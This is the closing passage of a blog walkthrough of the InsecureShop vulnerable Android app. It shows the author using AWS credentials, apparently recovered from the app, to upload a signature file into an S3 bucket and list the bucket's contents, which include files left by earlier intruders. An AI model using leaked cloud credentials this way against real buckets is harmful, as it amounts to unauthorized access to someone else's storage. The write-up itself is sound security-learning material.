</pre></table></code></div></div><p>I have also added a file to the bucket.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span><span class="nb">cat </span>ItsFading.txt 
X: @ItsFadinG_
LinkedIn: muhammadadel14

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span>aws s3api put-object <span class="nt">--bucket</span> elasticbeanstalk-us-west-2-094222047775  <span class="nt">--key</span> ItsFading.txt <span class="nt">--body</span> ItsFading.txt <span class="nt">--profile</span> iam
<span class="o">{</span>
    <span class="s2">"ETag"</span>: <span class="s2">"</span><span class="se">\"</span><span class="s2">fef1f3f060abea9b61991ad85c07442d</span><span class="se">\"</span><span class="s2">"</span>,
    <span class="s2">"ServerSideEncryption"</span>: <span class="s2">"AES256"</span>
<span class="o">}</span>
                                                                                          
┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/enumerate-iam]
└─<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://elasticbeanstalk-us-west-2-094222047775 <span class="nt">--recursive</span> <span class="nt">--human-readable</span> <span class="nt">--summarize</span> <span class="nt">--profile</span> iam                
2024-09-05 20:41:45   39 Bytes ItsFading.txt
2022-03-22 19:06:59    1.9 KiB Misconfiguration of Misconfiguration task lol - https://t.me/lasagnahowto , https://uvicorn.github.io &lt;- writeup here
2023-09-12 05:40:12    9 Bytes hainv15.txt
2023-07-18 20:56:23  279 Bytes pwned.txt

Total Objects: 4
   Total Size: 2.2 KiB
</pre></table></code></div></div><p>Follow me there, and don’t delete my file ::)</p><h2 id="conclusion"><strong>Conclusion</strong></h2><p>The InsecureShop app offer a deep dive into Android app security, helping to strengthen understanding of both common vulnerabilities and advanced exploitation techniques. I am eager to hear your thoughts and feedback. Any insights or suggestions for improvement are greatly appreciated! Stay Safe and Keep Hacking!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/android-security/'>Android Security</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/android-security/" class="post-tag no-text-decoration" >android security</a> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Walkthrough of The InsecureShop Android Vulnerable Application - Muhammad Adel&url=https://itsfading.github.io/posts/Insecureshop-Android-Vulnerable-Application-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Walkthrough of The InsecureShop Android Vulnerable Application - Muhammad Adel&u=https://itsfading.github.io/posts/Insecureshop-Android-Vulnerable-Application-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Walkthrough of The InsecureShop Android Vulnerable Application - Muhammad Adel&url=https://itsfading.github.io/posts/Insecureshop-Android-Vulnerable-Application-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CRTP-Commands-CheatSheet/">CRTP Commands CheatSheet</a><li><a href="/posts/Active-Directory-Authentication/">Active Directory Authentication</a><li><a href="/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/">MobileHackingLab IOS Challenges Writeups</a><li><a href="/posts/Active-Directory-Basics/">Active Directory Basics</a><li><a href="/posts/Cybertalents-Shadower-Machine-Writeup/">Cybertalents Shadower Machine Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Hackerone-Android-challenges-Writeup/"><div class="card-body"> <span class="timeago small" > Mar 7, 2022 <i class="unloaded">2022-03-07T16:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackerone Android Challenges Writeups</h3><div class="text-muted small"><p> Peace be upon all of you, on this writeup I am going to cover the solutions of all android challenges on Hackerone (Thermostat - Intentional Exercise - Oauthbreaker - Webdev). Difficulty: Easy and...</p></div></div></a></div><div class="card"> <a href="/posts/HexTree-Attack-Surface-App-Solutions/"><div class="card-body"> <span class="timeago small" > Nov 6, 2024 <i class="unloaded">2024-11-06T13:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HexTree Attack Surface Android App Solutions</h3><div class="text-muted small"><p> Introduction Peace be upon all of you. In this post I am going to share all the solutions for the Attack Surface Android app, which is part of the amazing Hextree Android Application Security cour...</p></div></div></a></div><div class="card"> <a href="/posts/I-owe-your-Request-HTTP-Request-Smuggling-leads-to-Full-Accounts-takeover/"><div class="card-body"> <span class="timeago small" > Aug 29, 2021 <i class="unloaded">2021-08-29T19:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>I owe your Request | HTTP Request Smuggling leads to Full Accounts takeover</h3><div class="text-muted small"><p> Introduction Peace be upon you all, this is actually my first writeup which is going to be about a very interesting vulnerability, HTTP Request Smuggling, which I found in a private program, which ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/" class="btn btn-outline-primary" prompt="Older"><p>Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge</p></a> <a href="/posts/HexTree-Attack-Surface-App-Solutions/" class="btn btn-outline-primary" prompt="Newer"><p>HexTree Attack Surface Android App Solutions</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/ItsFadinG_">Muhammad Adel</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by Passion and Enthusiasm</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://itsfading.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
